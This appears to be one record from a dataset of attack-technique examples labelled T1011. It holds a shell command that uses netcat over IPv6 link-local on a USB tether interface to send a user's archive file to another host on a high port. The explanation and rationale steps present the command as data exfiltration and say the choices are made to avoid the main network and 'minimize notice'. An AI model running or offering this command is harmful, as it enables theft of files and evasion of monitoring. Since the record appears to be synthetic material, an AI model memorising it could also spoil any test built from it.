command: nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz
explanation: Uses IPv6 over a USB tether interface (usb0) to exfiltrate via a non-standard TCP port, monitored narrowly by tcpdump. This is a separate medium and protocol path consistent with T1011.
rationale_steps: Constrain traffic to IPv6 on usb0 to avoid the primary IPv4 LAN.
Use high TCP port 54531 to minimize notice.
Run tcpdump with an IPv6 filter and discard capture.
nc -6 with a scoped link-local source ties the flow to usb0.
